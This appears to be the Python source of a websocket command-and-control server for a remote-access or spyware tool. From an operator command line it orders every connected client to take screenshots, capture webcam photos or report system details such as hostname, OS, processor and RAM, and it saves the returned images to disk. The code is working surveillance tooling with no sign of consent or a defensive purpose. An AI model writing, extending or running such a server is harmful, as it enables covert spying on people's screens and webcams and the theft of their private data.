import asyncio
import json
from datetime import datetime
from pathlib import Path
from typing import Dict

import websockets
from websockets.asyncio.server import ServerConnection


HOST = "0.0.0.0"
PORT = 8765
SAVE_DIR = Path(".")


clients: Dict[ServerConnection, str] = {}


def now_ts() -> str:
    return datetime.now().strftime("%Y%m%d_%H%M%S_%f")


async def handle_client(ws: ServerConnection) -> None:
    client_id = f"{ws.remote_address[0]}:{ws.remote_address[1]}" if ws.remote_address else "unknown"
    clients[ws] = client_id
    print(f"[+] Client connected: {client_id}")

    try:
        while True:
            message = await ws.recv()

            if isinstance(message, bytes):
                print(f"[!] Unexpected binary metadata from {client_id}, ignoring")
                continue

            try:
                meta = json.loads(message)
            except json.JSONDecodeError:
                print(f"[!] Invalid JSON from {client_id}, ignoring")
                continue

            msg_type = meta.get("type")

            if msg_type == "sys_info":
                reported_client_id = meta.get("client_id")
                source_id = (
                    reported_client_id if isinstance(reported_client_id, str) else client_id
                )
                hostname = meta.get("hostname")
                os_name = meta.get("os")
                os_release = meta.get("os_release")
                os_version = meta.get("os_version")
                arch = meta.get("architecture")
                processor = meta.get("processor")
                ram_bytes = meta.get("ram_total_bytes")

                print(f"[+] System info from client {source_id}:")
                print(f"    Hostname: {hostname}")
                print(f"    OS: {os_name} {os_release}")
                print(f"    Version: {os_version}")
                print(f"    Architecture: {arch}")
                print(f"    Processor: {processor}")
                if isinstance(ram_bytes, int):
                    ram_gib = ram_bytes / (1024**3)
                    print(f"    RAM: {ram_bytes} bytes ({ram_gib:.2f} GiB)")
                else:
                    print(f"    RAM: {ram_bytes}")
                continue

            if msg_type not in {"screenshot", "webcam"}:
                print(f"[i] Unknown message type from {client_id}: {meta}")
                continue

            reported_client_id = meta.get("client_id")
            source_id = reported_client_id if isinstance(reported_client_id, str) else client_id

            size = meta.get("size")
            if not isinstance(size, int) or size <= 0:
                print(f"[!] Invalid {msg_type} size from {source_id}: {size}")
                continue

            binary_payload = await ws.recv()
            if not isinstance(binary_payload, bytes):
                print(f"[!] Expected binary payload from {client_id}, got text")
                continue

            if len(binary_payload) != size:
                print(
                    f"[!] Size mismatch from {source_id}: expected {size}, got {len(binary_payload)}"
                )

            safe_source = source_id.replace(":", "_").replace("/", "_").replace("\\", "_")
            filename = SAVE_DIR / f"{msg_type}_{safe_source}_{now_ts()}.png"
            filename.write_bytes(binary_payload)
            print(f"[+] Saved {msg_type} from {source_id}: {filename}")
    except websockets.ConnectionClosed:
        print(f"[-] Client disconnected: {client_id}")
    except Exception as exc:
        print(f"[!] Error with client {client_id}: {exc}")
    finally:
        clients.pop(ws, None)


async def cli_loop() -> None:
    print(
        '[i] Type "screenshot" for screenshots, "webcam" for webcam photos, '
        '"info" for system info from all clients.'
    )
    while True:
        cmd = await asyncio.to_thread(input, "> ")
        cmd = cmd.strip().lower()

        if cmd == "screenshot":
            if not clients:
                print("[i] No clients connected.")
                continue

            payload = json.dumps({"action": "screenshot"})
            dead = []
            for ws, client_id in clients.items():
                try:
                    await ws.send(payload)
                    print(f"[>] Sent screenshot command to {client_id}")
                except Exception as exc:
                    print(f"[!] Failed to send to {client_id}: {exc}")
                    dead.append(ws)

            for ws in dead:
                clients.pop(ws, None)
        elif cmd == "webcam":
            if not clients:
                print("[i] No clients connected.")
                continue

            payload = json.dumps({"action": "webcam"})
            dead = []
            for ws, client_id in clients.items():
                try:
                    await ws.send(payload)
                    print(f"[>] Sent webcam command to {client_id}")
                except Exception as exc:
                    print(f"[!] Failed to send to {client_id}: {exc}")
                    dead.append(ws)

            for ws in dead:
                clients.pop(ws, None)
        elif cmd == "info":
            if not clients:
                print("[i] No clients connected.")
                continue

            payload = json.dumps({"action": "sys_info"})
            dead = []
            for ws, cid in clients.items():
                try:
                    await ws.send(payload)
                    print(f"[>] Sent sys_info command to {cid}")
                except Exception as exc:
                    print(f"[!] Failed to send to {cid}: {exc}")
                    dead.append(ws)

            for ws in dead:
                clients.pop(ws, None)
        elif cmd in {"quit", "exit"}:
            print("[i] Shutting down server command loop.")
            break
        elif cmd:
            print('[i] Unknown command. Use "screenshot", "webcam", "info", "quit", or "exit".')


async def main() -> None:
    async with websockets.serve(handle_client, HOST, PORT, max_size=None):
        print(f"[+] Server listening on ws://{HOST}:{PORT}")
        await cli_loop()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[i] Server stopped by user.")
